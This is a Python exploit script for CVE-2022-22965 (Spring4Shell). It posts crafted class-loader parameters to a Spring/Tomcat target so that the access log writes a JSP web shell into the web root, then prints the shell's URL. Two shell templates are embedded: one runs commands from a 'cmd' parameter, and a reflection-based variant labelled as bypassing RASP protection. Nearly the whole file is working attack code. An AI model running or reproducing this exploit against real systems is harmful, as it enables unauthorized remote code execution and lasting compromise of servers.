# adapted from https://aquasosal.tistory.com/24

from urllib.parse import urlparse
import requests
import argparse
import urllib3
import time

urllib3.disable_warnings()

WEBShell_BASIC= """%{directive}i page import="java.util.*,java.io.*" %{endtag}i %{starttag}i if(request.getParameter("%{parameter}i") != null){Process p = Runtime.getRuntime().exec(request.getParameter("%{parameter}i"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}} %{endtag}i"""


WEBShell_Reflection= """%{directive}i page import="java.util.*,java.io.*,java.lang.reflect.Method" %{endtag}i %{starttag}i try {
                                                                                                                                                              String processImplClassName = "java.lang.ProcessImpl";
                                                                                                                                                              Class<?> processImplClass = Class.forName(processImplClassName);
                                                                                                                                                              Method startMethod = processImplClass.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
                                                                                                                                                              startMethod.setAccessible(true);
                                                                                                                                                              Map<String, String> environment = null;
                                                                                                                                                              String dir = null;
                                                                                                                                                              ProcessBuilder.Redirect[] redirects = new ProcessBuilder.Redirect[]{ProcessBuilder.Redirect.PIPE, ProcessBuilder.Redirect.PIPE, ProcessBuilder.Redirect.PIPE};
                                                                                                                                                              boolean redirectErrorStream = true;
                                                                                                                                                              Process process = (Process) startMethod.invoke(null, request.getParameter("cmd").split(" "), environment, dir, redirects, redirectErrorStream);
                                                                                                                                                              BufferedReader reader = null;
                                                                                                                                                              reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                                                                                                                                              String line;
                                                                                                                                                              while ((line = reader.readLine()) != null) {
                                                                                                                                                                    out.println(line);
                                                                                                                                                                }
                                                                                                                                                              System.out.println("Agent RASP Bypassed");
                                                                                                                                                          } catch (Exception e) {
                                                                                                                                                              e.printStackTrace();
                                                                                                                                                      }%{endtag}i"""
classes = [
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix',
    'class.module.classLoader.resources.context.parent.pipeline.first.directory',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat',
]

Template_Variable = {
    'directive':'<%@',
    'endtag':'%>',
    'starttag':'<%',
    'parameter':'cmd'
}

def argv():
        parser = argparse.ArgumentParser(description='CVE-2022-22965 RCE Exploit')

        parser.add_argument('--url', help='target url EX) --url=http://localhost:8080', default="http://localhost:8080/exploit/greeting", dest="target", required=True)
        parser.add_argument('--file', help='WebShell file name to write to EX) --file=cmd', default="cmd", dest="filename")
        parser.add_argument('--dir', help='WebShell Directory Path to Write to. EX) --dir=webapps/ROOT',  default="webapps/ROOT")

        args = parser.parse_args()

        return args.filename, args.dir, args.target

def exploit():

    filename, directory, target = argv()

    if filename == "basic":
        pattern = WEBShell_BASIC
    elif filename == "reflection":
        pattern = WEBShell_Reflection

    payloads = {
        classes[0]:pattern,
        classes[1]:'.jsp',
        classes[2]:directory,
        classes[-2]:filename,
        classes[-1]:'',
    }

    res = requests.post(target, data={classes[-1]:'_'})
    print(f"\033[92m[+] INFO - {classes[0]} Resetting : _")

    res = requests.post(target, data=payloads)
    print(f"\033[92m[+] INFO - POST Response status code : {res.status_code}\033[0m")

    time.sleep(3)

    res = requests.get(target, headers=Template_Variable)

    print(f"\033[92m[+] INFO - GET Response status code : {res.status_code}\033[0m")

    time.sleep(1)

    res = requests.post(target, data={classes[0]:''})

    print(f"\033[92m[+] INFO - Exploit Success\033[0m\n")

    parse_target = urlparse(target)
    shellurl = f"{parse_target.scheme}://{parse_target.netloc}/{filename}.jsp"

    print(f"\033[95m[*] INFO - WebShell URL : {shellurl}\033[0m")

if __name__ == '__main__':
    exploit()